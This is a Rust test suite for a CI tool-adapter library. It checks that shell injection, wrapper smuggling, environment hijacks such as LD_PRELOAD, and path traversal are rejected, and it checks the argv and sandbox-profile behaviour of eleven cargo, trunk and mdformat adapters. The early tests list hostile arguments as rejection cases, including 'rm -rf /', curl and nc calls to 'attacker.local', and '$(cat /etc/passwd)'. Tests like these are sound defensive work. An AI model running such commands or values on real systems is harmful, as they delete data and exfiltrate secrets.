//! Comprehensive security injection and adapter validation test suite for mu-ci-tools.
//!
//! Validates:
//! - Shell metacharacter detection and prevention (command chaining, expansions, redirections).
//! - Shell wrapper smuggling rejection (`bash`, `sh`, `-c`, `rustc-wrapper`, `--config`, `LD_PRELOAD`).
//! - Path traversal rejection (`..`, absolute paths, working directory escape).
//! - Behavioral contracts for all 11 built-in tool adapters (`cargo-*`, `trunk`, `mdformat`).

use std::ffi::OsString;

use mu_ci_tools::{
    is_prohibited_shell_wrapper, validate_invocation_base, validate_path_within_working_dir,
    validate_safe_arg, validate_safe_relative_path, CargoAuditAdapter, CargoBenchAdapter,
    CargoBuildAdapter, CargoClippyAdapter, CargoFmtAdapter, CargoLlvmCovAdapter, CargoMiriAdapter,
    CargoPublishAdapter, CargoTestAdapter, MdformatAdapter, ParsedBenchmark, ParsedTestCase,
    TestCaseStatus, ToolAdapter, ToolError, ToolInvocation, ToolRegistry, ToolValidationError,
    TrunkAdapter,
};

#[test]
fn test_command_chaining_rejections() {
    let injection_cases = [
        ("--features foo; rm -rf /", ";"),
        ("test && curl http://attacker.local", "&&"),
        ("test || rm -rf .", "||"),
        ("test | nc attacker.local 1337", "|"),
        ("--workspace &", "&"),
        ("target/release/server; id", ";"),
    ];

    for (bad_arg, token) in injection_cases {
        assert_eq!(
            validate_safe_arg(bad_arg),
            Err(ToolValidationError::ShellMetacharacterDetected {
                arg: bad_arg.to_string(),
                token: token.to_string(),
            }),
            "Failed to reject shell metacharacter in: {bad_arg}"
        );

        let inv = ToolInvocation::new("cargo-test", [bad_arg]);
        assert_eq!(
            validate_invocation_base(&inv),
            Err(ToolValidationError::ShellMetacharacterDetected {
                arg: bad_arg.to_string(),
                token: token.to_string(),
            })
        );
    }
}

#[test]
fn test_subshell_and_variable_expansion_rejections() {
    let expansion_cases = [
        ("`id`", "`"),
        ("prefix`whoami`suffix", "`"),
        ("$(whoami)", "$("),
        ("--features=$(cat /etc/passwd)", "$("),
        ("${IFS}", "${"),
        ("--target=${TARGET_ARCH}", "${"),
        ("foo${BAR}baz", "${"),
    ];

    for (bad_arg, token) in expansion_cases {
        assert_eq!(
            validate_safe_arg(bad_arg),
            Err(ToolValidationError::ShellMetacharacterDetected {
                arg: bad_arg.to_string(),
                token: token.to_string(),
            }),
            "Failed to reject expansion token in: {bad_arg}"
        );
    }
}

#[test]
fn test_redirection_rejections() {
    let redirection_cases = [
        ("> /etc/passwd", ">"),
        (">> /tmp/payload.sh", ">>"),
        ("< /dev/zero", "<"),
        ("<< EOF", "<<"),
        ("out.txt > log.txt", ">"),
    ];

    for (bad_arg, token) in redirection_cases {
        assert_eq!(
            validate_safe_arg(bad_arg),
            Err(ToolValidationError::ShellMetacharacterDetected {
                arg: bad_arg.to_string(),
                token: token.to_string(),
            }),
            "Failed to reject redirection token in: {bad_arg}"
        );
    }
}

#[test]
fn test_shell_wrapper_smuggling_rejections() {
    let wrappers = [
        "bash",
        "sh",
        "zsh",
        "dash",
        "fish",
        "ksh",
        "csh",
        "tcsh",
        "cmd",
        "cmd.exe",
        "powershell",
        "powershell.exe",
        "pwsh",
        "eval",
        "exec",
        "-c",
        "/bin/sh",
        "/bin/bash",
        "/usr/bin/env",
        "/usr/bin/sh",
        "build.rustc-wrapper=/bin/sh",
        "--config",
        "--config=build.rustc-wrapper='sh'",
        "bash -c evil",
        "sh -c id",
    ];

    for wrapper in wrappers {
        assert!(
            is_prohibited_shell_wrapper(wrapper),
            "Expected `{wrapper}` to be recognized as prohibited wrapper"
        );
        assert_eq!(
            validate_safe_arg(wrapper),
            Err(ToolValidationError::ProhibitedShellWrapper(
                wrapper.to_string()
            )),
            "Failed to reject wrapper: {wrapper}"
        );
    }

    // Prohibited environment variable hijack keys
    let bad_envs = [
        ("LD_PRELOAD", "/tmp/evil.so"),
        ("LD_LIBRARY_PATH", "/tmp/lib"),
        ("DYLD_INSERT_LIBRARIES", "/tmp/evil.dylib"),
        ("DYLD_LIBRARY_PATH", "/tmp/lib"),
        ("RUSTC_WRAPPER", "/bin/sh"),
        ("CARGO_BUILD_RUSTC_WRAPPER", "sh"),
        ("BASH_ENV", "/tmp/.bashrc"),
        ("ENV", "/tmp/.shrc"),
        ("PROMPT_COMMAND", "curl evil"),
    ];

    for (key, val) in bad_envs {
        let inv = ToolInvocation::new("cargo-test", ["--workspace"]).with_env(key, val);
        assert_eq!(
            validate_invocation_base(&inv),
            Err(ToolValidationError::ProhibitedShellWrapper(key.to_string())),
            "Failed to reject forbidden environment variable: {key}"
        );
    }
}

#[test]
fn test_path_traversal_rejections() {
    let traversals = [
        "../../etc/shadow",
        "/etc/mu-isolation/ceiling.yml",
        "/etc/passwd",
        "\\Windows\\System32",
        "C:\\foo\\bar",
        "docs/../../escape",
        "crates/core/../../../outside",
        "..",
        "../",
    ];

    for path in traversals {
        assert!(
            validate_safe_relative_path(path).is_err(),
            "Path traversal `{path}` should have been rejected"
        );
    }

    let temp = tempfile::tempdir().expect("tempdir");
    let safe_dir = temp.path().join("safe_dir");
    std::fs::create_dir_all(&safe_dir).expect("create safe dir");
    std::fs::write(safe_dir.join("file.txt"), "hello").expect("write file");

    assert!(validate_path_within_working_dir(temp.path(), "safe_dir/file.txt").is_ok());
    assert!(validate_path_within_working_dir(temp.path(), "../outside.txt").is_err());
}

#[test]
fn test_cargo_fmt_adapter() {
    let adapter = CargoFmtAdapter;
    assert_eq!(adapter.name(), "cargo-fmt");

    // 1. Formatting mode (no --check): writable_dirs is ["."]
    let fmt_inv = ToolInvocation::new("cargo-fmt", ["--all", "-p", "k3-core"]);
    assert!(adapter.validate(&fmt_inv).is_ok());
    let argv = adapter.build_argv(&fmt_inv).expect("build argv");
    assert_eq!(
        argv,
        vec![
            OsString::from("cargo"),
            OsString::from("fmt"),
            OsString::from("--all"),
            OsString::from("-p"),
            OsString::from("k3-core"),
        ]
    );
    let profile = adapter.sandbox_profile(&fmt_inv);
    assert!(!profile.allow_network);
    assert_eq!(profile.writable_dirs, vec![".".to_string()]);
    assert_eq!(profile.exec_binaries, vec!["cargo", "rustfmt"]);
    assert_eq!(profile.required_memlock_kb, 65_536);

    // 2. Check mode: writable_dirs is empty
    let check_inv = ToolInvocation::new("cargo-fmt", ["--all", "--check"]);
    assert!(adapter.validate(&check_inv).is_ok());
    let profile_check = adapter.sandbox_profile(&check_inv);
    assert!(profile_check.writable_dirs.is_empty());

    // 3. Check mode via `-- --check`
    let dd_check_inv = ToolInvocation::new("cargo-fmt", ["--all", "--", "--check"]);
    assert!(adapter.validate(&dd_check_inv).is_ok());
    let profile_dd = adapter.sandbox_profile(&dd_check_inv);
    assert!(profile_dd.writable_dirs.is_empty());

    // 4. Rejection of unsupported flags
    let bad_inv = ToolInvocation::new("cargo-fmt", ["--release"]);
    assert_eq!(
        adapter.validate(&bad_inv),
        Err(ToolValidationError::UnsupportedFlag {
            tool: "cargo-fmt".to_string(),
            flag: "--release".to_string(),
        })
    );

    // 5. Rejection of unsupported flag after `--`
    let bad_dd_inv = ToolInvocation::new("cargo-fmt", ["--", "--write-mode"]);
    assert_eq!(
        adapter.validate(&bad_dd_inv),
        Err(ToolValidationError::UnsupportedFlag {
            tool: "cargo-fmt".to_string(),
            flag: "--write-mode".to_string(),
        })
    );
}

#[test]
fn test_cargo_clippy_adapter() {
    let adapter = CargoClippyAdapter;
    assert_eq!(adapter.name(), "cargo-clippy");

    let inv = ToolInvocation::new(
        "cargo-clippy",
        [
            "--workspace",
            "--all-targets",
            "--all-features",
            "--target",
            "riscv64gc-unknown-linux-gnu",
            "--",
            "-D",
            "warnings",
        ],
    );
    assert!(adapter.validate(&inv).is_ok());

    let argv = adapter.build_argv(&inv).expect("build argv");
    assert_eq!(
        argv,
        vec![
            OsString::from("cargo"),
            OsString::from("clippy"),
            OsString::from("--workspace"),
            OsString::from("--all-targets"),
            OsString::from("--all-features"),
            OsString::from("--target"),
            OsString::from("riscv64gc-unknown-linux-gnu"),
            OsString::from("--"),
            OsString::from("-D"),
            OsString::from("warnings"),
        ]
    );

    let profile = adapter.sandbox_profile(&inv);
    assert!(!profile.allow_network);
    assert_eq!(profile.writable_dirs, vec!["target".to_string()]);
    assert_eq!(
        profile.exec_binaries,
        vec!["cargo", "rustc", "clippy-driver"]
    );
    assert_eq!(profile.required_memlock_kb, 65_536);

    // Warning metric counting
    let stdout = b"warning: unused variable `x`\nwarning: redundant clone\n";
    let stderr = b"warning: 2 warnings emitted\n";
    let metrics = adapter
        .parse_metrics(stdout, stderr, 0)
        .expect("parse metrics");
    assert_eq!(metrics.warnings_count, Some(3));

    // Rejection of invalid flags
    let bad_inv = ToolInvocation::new("cargo-clippy", ["--invalid-flag"]);
    assert!(adapter.validate(&bad_inv).is_err());
}

#[test]
fn test_cargo_test_adapter() {
    let adapter = CargoTestAdapter;
    assert_eq!(adapter.name(), "cargo-test");

    let inv = ToolInvocation::new(
        "cargo-test",
        [
            "--workspace",
            "--all-targets",
            "--locked",
            "--",
            "--nocapture",
            "--test-threads=2",
            "test_sanitizer",
        ],
    );
    assert!(adapter.validate(&inv).is_ok());

    let argv = adapter.build_argv(&inv).expect("build argv");
    assert_eq!(
        argv,
        vec![
            OsString::from("cargo"),
            OsString::from("test"),
            OsString::from("--workspace"),
            OsString::from("--all-targets"),
            OsString::from("--locked"),
            OsString::from("--"),
            OsString::from("--nocapture"),
            OsString::from("--test-threads=2"),
            OsString::from("test_sanitizer"),
        ]
    );

    let profile = adapter.sandbox_profile(&inv);
    assert_eq!(
        profile.writable_dirs,
        vec!["target".to_string(), "/tmp".to_string()]
    );
    assert_eq!(profile.exec_binaries, vec!["cargo", "rustc"]);

    // Test result metric parsing
    let stdout = b"running 5 tests\ntest result: ok. 5 passed; 0 failed; 0 ignored; 0 measured; 0 filtered out; finished in 0.12s\nrunning 2 tests\ntest result: FAILED. 1 passed; 1 failed; 0 ignored\n";
    let metrics = adapter
        .parse_metrics(stdout, b"", 1)
        .expect("parse metrics");
    assert_eq!(metrics.tests_passed, Some(6));
    assert_eq!(metrics.tests_failed, Some(1));

    // Rejection of invalid flag after `--`
    let bad_dd = ToolInvocation::new("cargo-test", ["--", "--bad-flag"]);
    assert_eq!(
        adapter.validate(&bad_dd),
        Err(ToolValidationError::UnsupportedFlag {
            tool: "cargo-test".to_string(),
            flag: "--bad-flag".to_string(),
        })
    );
}

#[test]
fn test_cargo_bench_adapter() {
    let adapter = CargoBenchAdapter;
    assert_eq!(adapter.name(), "cargo-bench");

    let inv = ToolInvocation::new(
        "cargo-bench",
        [
            "--workspace",
            "--bench",
            "gemm_bench",
            "--target",
            "riscv64gc-unknown-linux-gnu",
        ],
    );
    assert!(adapter.validate(&inv).is_ok());

    let argv = adapter.build_argv(&inv).expect("build argv");
    assert_eq!(
        argv,
        vec![
            OsString::from("cargo"),
            OsString::from("bench"),
            OsString::from("--workspace"),
            OsString::from("--bench"),
            OsString::from("gemm_bench"),
            OsString::from("--target"),
            OsString::from("riscv64gc-unknown-linux-gnu"),
        ]
    );

    let profile = adapter.sandbox_profile(&inv);
    assert!(!profile.allow_network);
    assert_eq!(profile.writable_dirs, vec!["target".to_string()]);
    assert_eq!(profile.exec_binaries, vec!["cargo", "rustc"]);

    let bad_inv = ToolInvocation::new("cargo-bench", ["--doc"]);
    assert!(adapter.validate(&bad_inv).is_err());
}

#[test]
fn test_cargo_audit_adapter() {
    let adapter = CargoAuditAdapter;
    assert_eq!(adapter.name(), "cargo-audit");

    // Default: auto-injects default DB and --no-fetch
    let default_inv = ToolInvocation::new("cargo-audit", ["--deny", "warnings"]);
    assert!(adapter.validate(&default_inv).is_ok());
    let argv = adapter.build_argv(&default_inv).expect("build argv");
    assert_eq!(
        argv,
        vec![
            OsString::from("cargo"),
            OsString::from("audit"),
            OsString::from("--db"),
            OsString::from("/var/lib/action-runner/.cargo/advisory-db"),
            OsString::from("--no-fetch"),
            OsString::from("--deny"),
            OsString::from("warnings"),
        ]
    );

    // Explicit DB and --no-fetch: no duplicate insertion
    let explicit_inv = ToolInvocation::new(
        "cargo-audit",
        [
            "--db",
            "/var/lib/action-runner/.cargo/advisory-db",
            "--no-fetch",
            "--json",
            "--file",
            "Cargo.lock",
        ],
    );
    assert!(adapter.validate(&explicit_inv).is_ok());
    let argv_exp = adapter.build_argv(&explicit_inv).expect("build argv");
    assert_eq!(
        argv_exp,
        vec![
            OsString::from("cargo"),
            OsString::from("audit"),
            OsString::from("--db"),
            OsString::from("/var/lib/action-runner/.cargo/advisory-db"),
            OsString::from("--no-fetch"),
            OsString::from("--json"),
            OsString::from("--file"),
            OsString::from("Cargo.lock"),
        ]
    );

    let profile = adapter.sandbox_profile(&default_inv);
    assert!(!profile.allow_network);
    assert!(profile.writable_dirs.is_empty());
    assert_eq!(
        profile.readable_dirs,
        vec![
            ".".to_string(),
            "/var/lib/action-runner/.cargo/advisory-db".to_string()
        ]
    );
    assert_eq!(profile.exec_binaries, vec!["cargo", "cargo-audit"]);
}

#[test]
fn test_cargo_llvm_cov_adapter() {
    let adapter = CargoLlvmCovAdapter;
    assert_eq!(adapter.name(), "cargo-llvm-cov");

    let inv = ToolInvocation::new(
        "cargo-llvm-cov",
        [
            "--workspace",
            "--all-features",
            "--lcov",
            "--output-path",
            "target/lcov.info",
            "--fail-under-lines",
            "85.5",
        ],
    );
    assert!(adapter.validate(&inv).is_ok());

    let argv = adapter.build_argv(&inv).expect("build argv");
    assert_eq!(
        argv,
        vec![
            OsString::from("cargo"),
            OsString::from("llvm-cov"),
            OsString::from("--workspace"),
            OsString::from("--all-features"),
            OsString::from("--lcov"),
            OsString::from("--output-path"),
            OsString::from("target/lcov.info"),
            OsString::from("--fail-under-lines"),
            OsString::from("85.5"),
        ]
    );

    // Percentage parsing from summary text
    let stdout_text = b"Filename   Regions  Missed   Cover\nTOTAL          120      10  85.50%\n";
    let metrics_text = adapter
        .parse_metrics(stdout_text, b"", 0)
        .expect("parse metrics text");
    assert_eq!(metrics_text.coverage_pct, Some(85.50));

    // Percentage parsing from JSON
    let stdout_json = br#"{"data":[{"totals":{"lines":{"percent":92.3}}}]}"#;
    let metrics_json = adapter
        .parse_metrics(stdout_json, b"", 0)
        .expect("parse metrics json");
    assert_eq!(metrics_json.coverage_pct, Some(92.3));

    // Range validation on fail-under-lines
    let bad_pct = ToolInvocation::new("cargo-llvm-cov", ["--fail-under-lines", "150.0"]);
    assert!(adapter.validate(&bad_pct).is_err());
}

#[test]
fn test_cargo_miri_adapter() {
    let adapter = CargoMiriAdapter;
    assert_eq!(adapter.name(), "cargo-miri");

    // Without leading "test"
    let inv1 = ToolInvocation::new(
        "cargo-miri",
        ["--workspace", "-p", "k3-core", "--", "test_isolation"],
    );
    assert!(adapter.validate(&inv1).is_ok());
    let argv1 = adapter.build_argv(&inv1).expect("build argv 1");
    assert_eq!(
        argv1,
        vec![
            OsString::from("cargo"),
            OsString::from("+nightly"),
            OsString::from("miri"),
            OsString::from("test"),
            OsString::from("--workspace"),
            OsString::from("-p"),
            OsString::from("k3-core"),
            OsString::from("--"),
            OsString::from("test_isolation"),
        ]
    );

    // With explicit leading "test": must not duplicate "test"
    let inv2 = ToolInvocation::new("cargo-miri", ["test", "--workspace"]);
    assert!(adapter.validate(&inv2).is_ok());
    let argv2 = adapter.build_argv(&inv2).expect("build argv 2");
    assert_eq!(
        argv2,
        vec![
            OsString::from("cargo"),
            OsString::from("+nightly"),
            OsString::from("miri"),
            OsString::from("test"),
            OsString::from("--workspace"),
        ]
    );

    let profile = adapter.sandbox_profile(&inv1);
    assert_eq!(
        profile.readable_dirs,
        vec![
            ".".to_string(),
            "/var/lib/action-runner/.rustup".to_string()
        ]
    );
    assert_eq!(
        profile.exec_binaries,
        vec!["cargo", "cargo-miri", "miri", "rustc"]
    );
}

#[test]
fn test_cargo_publish_adapter() {
    let adapter = CargoPublishAdapter;
    assert_eq!(adapter.name(), "cargo-publish");

    // Default without --registry: auto-injects --registry muregist
    let inv_default = ToolInvocation::new("cargo-publish", ["-p", "mu-ci-tools", "--dry-run"]);
    assert!(adapter.validate(&inv_default).is_ok());
    let argv = adapter.build_argv(&inv_default).expect("build argv");
    assert_eq!(
        argv,
        vec![
            OsString::from("cargo"),
            OsString::from("publish"),
            OsString::from("--registry"),
            OsString::from("muregist"),
            OsString::from("-p"),
            OsString::from("mu-ci-tools"),
            OsString::from("--dry-run"),
        ]
    );

    // Explicit --registry muregist
    let inv_reg = ToolInvocation::new(
        "cargo-publish",
        ["--registry", "muregist", "-p", "mu-ci-tools"],
    );
    assert!(adapter.validate(&inv_reg).is_ok());
    let argv_reg = adapter.build_argv(&inv_reg).expect("build argv");
    assert_eq!(
        argv_reg,
        vec![
            OsString::from("cargo"),
            OsString::from("publish"),
            OsString::from("--registry"),
            OsString::from("muregist"),
            OsString::from("-p"),
            OsString::from("mu-ci-tools"),
        ]
    );

    // Rejection of public registry (only internal muregist allowed)
    let inv_bad_reg = ToolInvocation::new(
        "cargo-publish",
        ["--registry", "crates-io", "-p", "mu-ci-tools"],
    );
    assert_eq!(
        adapter.validate(&inv_bad_reg),
        Err(ToolValidationError::InvalidArgValue {
            tool: "cargo-publish".to_string(),
            flag: "--registry".to_string(),
            value: "crates-io".to_string(),
            reason: "only internal registry `muregist` is permitted".to_string(),
        })
    );

    let profile = adapter.sandbox_profile(&inv_default);
    assert!(profile.allow_network);
    assert_eq!(
        profile.allowed_egress_hosts,
        vec!["registry.ci.ci.internal:8444".to_string()]
    );
    assert_eq!(profile.exec_binaries, vec!["cargo", "rustc"]);
}

#[test]
fn test_cargo_build_adapter() {
    let adapter = CargoBuildAdapter;
    assert_eq!(adapter.name(), "cargo-build");

    let inv = ToolInvocation::new(
        "cargo-build",
        [
            "--workspace",
            "--release",
            "--bins",
            "--target",
            "riscv64gc-unknown-linux-gnu",
            "-p",
            "k3-engine",
            "--locked",
        ],
    );
    assert!(adapter.validate(&inv).is_ok());

    let argv = adapter.build_argv(&inv).expect("build argv");
    assert_eq!(
        argv,
        vec![
            OsString::from("cargo"),
            OsString::from("build"),
            OsString::from("--workspace"),
            OsString::from("--release"),
            OsString::from("--bins"),
            OsString::from("--target"),
            OsString::from("riscv64gc-unknown-linux-gnu"),
            OsString::from("-p"),
            OsString::from("k3-engine"),
            OsString::from("--locked"),
        ]
    );

    let profile = adapter.sandbox_profile(&inv);
    assert!(!profile.allow_network);
    assert_eq!(profile.writable_dirs, vec!["target".to_string()]);
    assert_eq!(profile.exec_binaries, vec!["cargo", "rustc"]);
    assert_eq!(profile.required_memlock_kb, 65_536);

    // Rejection of prohibited wrapper flags and -Z
    for prohibited in ["--config", "-Z"] {
        let bad_inv = ToolInvocation::new("cargo-build", [prohibited]);
        assert!(
            adapter.validate(&bad_inv).is_err(),
            "Expected `{prohibited}` to be rejected"
        );
    }
}

#[test]
fn test_trunk_adapter() {
    let adapter = TrunkAdapter;
    assert_eq!(adapter.name(), "trunk");

    // Prepends "build" when not explicitly supplied
    let inv1 = ToolInvocation::new(
        "trunk",
        [
            "--release",
            "--dist",
            "dist/web",
            "--public-url",
            "/",
            "--filehash",
            "true",
            "crates/web/index.html",
        ],
    );
    assert!(adapter.validate(&inv1).is_ok());
    let argv1 = adapter.build_argv(&inv1).expect("build argv 1");
    assert_eq!(
        argv1,
        vec![
            OsString::from("trunk"),
            OsString::from("build"),
            OsString::from("--release"),
            OsString::from("--dist"),
            OsString::from("dist/web"),
            OsString::from("--public-url"),
            OsString::from("/"),
            OsString::from("--filehash"),
            OsString::from("true"),
            OsString::from("crates/web/index.html"),
        ]
    );

    // Explicit "build" subcommand
    let inv2 = ToolInvocation::new("trunk", ["build", "--release"]);
    assert!(adapter.validate(&inv2).is_ok());
    let argv2 = adapter.build_argv(&inv2).expect("build argv 2");
    assert_eq!(
        argv2,
        vec![
            OsString::from("trunk"),
            OsString::from("build"),
            OsString::from("--release"),
        ]
    );

    let profile = adapter.sandbox_profile(&inv1);
    assert!(!profile.allow_network);
    assert_eq!(
        profile.writable_dirs,
        vec!["target".to_string(), "dist".to_string()]
    );
    assert_eq!(
        profile.exec_binaries,
        vec!["trunk", "cargo", "rustc", "wasm-bindgen"]
    );
    assert_eq!(profile.required_memlock_kb, 65_536);

    // Rejection of non-build subcommands
    for bad_sub in ["serve", "watch", "clean", "config"] {
        let bad_inv = ToolInvocation::new("trunk", [bad_sub]);
        assert_eq!(
            adapter.validate(&bad_inv),
            Err(ToolValidationError::UnsupportedFlag {
                tool: "trunk".to_string(),
                flag: bad_sub.to_string(),
            })
        );
    }

    // Rejection of invalid --filehash
    let bad_hash = ToolInvocation::new("trunk", ["--filehash", "maybe"]);
    assert!(adapter.validate(&bad_hash).is_err());
}

#[test]
fn test_mdformat_adapter() {
    let adapter = MdformatAdapter;
    assert_eq!(adapter.name(), "mdformat");

    // With explicit paths
    let inv1 = ToolInvocation::new(
        "mdformat",
        [
            "--check",
            "--number",
            "--wrap",
            "keep",
            "--end-of-line",
            "lf",
            "README.md",
            "docs/overview.md",
        ],
    );
    assert!(adapter.validate(&inv1).is_ok());
    let argv1 = adapter.build_argv(&inv1).expect("build argv 1");
    assert_eq!(
        argv1,
        vec![
            OsString::from("mdformat"),
            OsString::from("--check"),
            OsString::from("--number"),
            OsString::from("--wrap"),
            OsString::from("keep"),
            OsString::from("--end-of-line"),
            OsString::from("lf"),
            OsString::from("README.md"),
            OsString::from("docs/overview.md"),
        ]
    );

    // Defaults path to "." if only flags passed
    let inv_no_paths = ToolInvocation::new("mdformat", ["--check"]);
    assert!(adapter.validate(&inv_no_paths).is_ok());
    let argv_no_paths = adapter.build_argv(&inv_no_paths).expect("build argv 2");
    assert_eq!(
        argv_no_paths,
        vec![
            OsString::from("mdformat"),
            OsString::from("--check"),
            OsString::from("."),
        ]
    );

    // Check mode: writable_dirs empty
    let profile_check = adapter.sandbox_profile(&inv1);
    assert!(!profile_check.allow_network);
    assert!(profile_check.writable_dirs.is_empty());
    assert_eq!(
        profile_check.readable_dirs,
        vec![".".to_string(), "/var/lib/action-runner/.local".to_string()]
    );
    assert_eq!(profile_check.exec_binaries, vec!["mdformat", "python3"]);
    assert_eq!(profile_check.required_memlock_kb, 32_768);

    // Format mode: writable_dirs has "."
    let inv_fmt = ToolInvocation::new("mdformat", ["README.md"]);
    let profile_fmt = adapter.sandbox_profile(&inv_fmt);
    assert_eq!(profile_fmt.writable_dirs, vec![".".to_string()]);

    // Value validations
    let bad_wrap = ToolInvocation::new("mdformat", ["--wrap", "invalid"]);
    assert!(adapter.validate(&bad_wrap).is_err());

    let bad_eol = ToolInvocation::new("mdformat", ["--end-of-line", "unix"]);
    assert!(adapter.validate(&bad_eol).is_err());
}

#[test]
fn test_tool_registry_with_builtin_adapters_coverage() {
    let registry = ToolRegistry::with_builtin_adapters();

    let expected_tools = [
        "cargo-audit",
        "cargo-bench",
        "cargo-build",
        "cargo-clippy",
        "cargo-fmt",
        "cargo-llvm-cov",
        "cargo-miri",
        "cargo-publish",
        "cargo-test",
        "mdformat",
        "trunk",
    ];

    assert_eq!(registry.tool_names(), expected_tools);

    // Dispatch test for each of the 11 tools
    let test_invs = [
        ToolInvocation::new("cargo-fmt", ["--check"]),
        ToolInvocation::new("cargo-clippy", ["--workspace"]),
        ToolInvocation::new("cargo-test", ["--workspace"]),
        ToolInvocation::new("cargo-bench", ["--workspace"]),
        ToolInvocation::new("cargo-audit", ["--deny", "warnings"]),
        ToolInvocation::new("cargo-llvm-cov", ["--workspace"]),
        ToolInvocation::new("cargo-miri", ["--workspace"]),
        ToolInvocation::new("cargo-publish", ["--dry-run"]),
        ToolInvocation::new("cargo-build", ["--workspace"]),
        ToolInvocation::new("trunk", ["--release"]),
        ToolInvocation::new("mdformat", ["--check"]),
    ];

    for inv in test_invs {
        let (argv, profile) = registry
            .validate_and_build(&inv)
            .unwrap_or_else(|e| panic!("validate_and_build failed for {}: {:?}", inv.tool_name, e));
        assert!(!argv.is_empty());
        assert!(!profile.exec_binaries.is_empty());
    }

    // Lookup of unknown tool fails with ToolValidationError::UnknownTool
    assert_eq!(
        registry.validate_and_build(&ToolInvocation::new("unknown", Vec::<String>::new())),
        Err(ToolError::Validation(ToolValidationError::UnknownTool(
            "unknown".to_string()
        )))
    );
}

#[test]
fn test_granular_test_case_extraction_in_cargo_test_and_miri() {
    let test_adapter = CargoTestAdapter;
    let miri_adapter = CargoMiriAdapter;

    let stdout = b"\
running 4 tests
test adapters::tests::test_fast_pass ... ok (14ms)
test adapters::tests::test_slow_pass ... ok (1.25s)
test adapters::tests::test_skipped_case ... ignored
test adapters::tests::test_assertion_fail ... FAILED (8ms)

failures:

---- adapters::tests::test_assertion_fail stdout ----
thread 'adapters::tests::test_assertion_fail' panicked at src/lib.rs:42:9:
assertion `left == right` failed
  left: 10
 right: 20

failures:
    adapters::tests::test_assertion_fail

test result: FAILED. 2 passed; 1 failed; 1 ignored; 0 measured; 0 filtered out; finished in 1.27s
";

    for adapter in [
        &test_adapter as &dyn ToolAdapter,
        &miri_adapter as &dyn ToolAdapter,
    ] {
        let metrics = adapter
            .parse_metrics(stdout, b"", 101)
            .expect("parse granular test metrics");

        assert_eq!(metrics.exit_code, 101);
        assert_eq!(metrics.tests_passed, Some(2));
        assert_eq!(metrics.tests_failed, Some(1));
        assert_eq!(metrics.tests_ignored, Some(1));
        assert_eq!(metrics.test_cases.len(), 4);

        assert_eq!(
            metrics.test_cases[0],
            ParsedTestCase {
                test_name: "adapters::tests::test_fast_pass".to_string(),
                status: TestCaseStatus::Passed,
                duration_ms: Some(14),
                failure_snippet: None,
            }
        );
        assert_eq!(
            metrics.test_cases[1],
            ParsedTestCase {
                test_name: "adapters::tests::test_slow_pass".to_string(),
                status: TestCaseStatus::Passed,
                duration_ms: Some(1250),
                failure_snippet: None,
            }
        );
        assert_eq!(
            metrics.test_cases[2],
            ParsedTestCase {
                test_name: "adapters::tests::test_skipped_case".to_string(),
                status: TestCaseStatus::Ignored,
                duration_ms: None,
                failure_snippet: None,
            }
        );
        assert_eq!(
            metrics.test_cases[3].test_name,
            "adapters::tests::test_assertion_fail"
        );
        assert_eq!(metrics.test_cases[3].status, TestCaseStatus::Failed);
        assert_eq!(metrics.test_cases[3].duration_ms, Some(8));
        let snippet = metrics.test_cases[3]
            .failure_snippet
            .as_deref()
            .expect("failure snippet must be captured");
        assert!(snippet.contains("assertion `left == right` failed"));
        assert!(snippet.contains("left: 10"));
    }
}

#[test]
fn test_granular_benchmark_extraction_libtest_and_criterion_with_hardware_tags() {
    let bench_adapter = CargoBenchAdapter;

    let stdout = b"\
# hardware profile: arch=riscv64 cluster=A100 vlen=1024
running 2 tests
test kernels::rvv_gemm_q4_0 ... bench:       1,240 ns/iter (+/- 35) = 4096 MB/s
test kernels::rvv_rmsnorm_f32 ... bench:         360 ns/iter (+/- 12) = 1024 MB/s

# switching cluster context: arch=riscv64 cluster=X100 vlen=256
tokenizer/encode_batch  time:   [9.80 us 10.00 us 10.20 us]
                        thrpt:  [490.0 MB/s 500.0 MB/s 510.0 MB/s]
Benchmarking kv_cache/page_lookup: Collecting 100 samples
kv_cache/page_lookup
                        time:   [45.0 ns 50.0 ns 55.0 ns]
";

    let metrics = bench_adapter
        .parse_metrics(stdout, b"", 0)
        .expect("parse granular bench metrics");

    assert_eq!(metrics.exit_code, 0);
    assert_eq!(metrics.benchmarks.len(), 4);

    assert_eq!(
        metrics.benchmarks[0],
        ParsedBenchmark {
            bench_name: "kernels::rvv_gemm_q4_0".to_string(),
            ns_per_iter: 1240.0,
            variance_ns: 35.0,
            throughput_mb_s: Some(4096.0),
            arch: Some("riscv64".to_string()),
            cpu_cluster: Some("A100".to_string()),
            vlen_bits: Some(1024),
        }
    );

    assert_eq!(
        metrics.benchmarks[1],
        ParsedBenchmark {
            bench_name: "kernels::rvv_rmsnorm_f32".to_string(),
            ns_per_iter: 360.0,
            variance_ns: 12.0,
            throughput_mb_s: Some(1024.0),
            arch: Some("riscv64".to_string()),
            cpu_cluster: Some("A100".to_string()),
            vlen_bits: Some(1024),
        }
    );

    assert_eq!(metrics.benchmarks[2].bench_name, "tokenizer/encode_batch");
    assert!((metrics.benchmarks[2].ns_per_iter - 10_000.0).abs() < 1e-6);
    assert!((metrics.benchmarks[2].variance_ns - 200.0).abs() < 1e-6);
    assert_eq!(metrics.benchmarks[2].throughput_mb_s, Some(500.0));
    assert_eq!(metrics.benchmarks[2].arch.as_deref(), Some("riscv64"));
    assert_eq!(metrics.benchmarks[2].cpu_cluster.as_deref(), Some("X100"));
    assert_eq!(metrics.benchmarks[2].vlen_bits, Some(256));

    assert_eq!(
        metrics.benchmarks[3],
        ParsedBenchmark {
            bench_name: "kv_cache/page_lookup".to_string(),
            ns_per_iter: 50.0,
            variance_ns: 5.0,
            throughput_mb_s: None,
            arch: Some("riscv64".to_string()),
            cpu_cluster: Some("X100".to_string()),
            vlen_bits: Some(256),
        }
    );

    // Aggregate fields preserved
    let expected_avg_ns = (1240.0 + 360.0 + 10_000.0 + 50.0) / 4.0;
    let expected_avg_mb = (4096.0 + 1024.0 + 500.0) / 3.0;
    assert!((metrics.bench_ns_per_iter.expect("aggregate ns") - expected_avg_ns).abs() < 1e-6);
    assert!((metrics.bench_mb_per_sec.expect("aggregate mb/s") - expected_avg_mb).abs() < 1e-6);
}
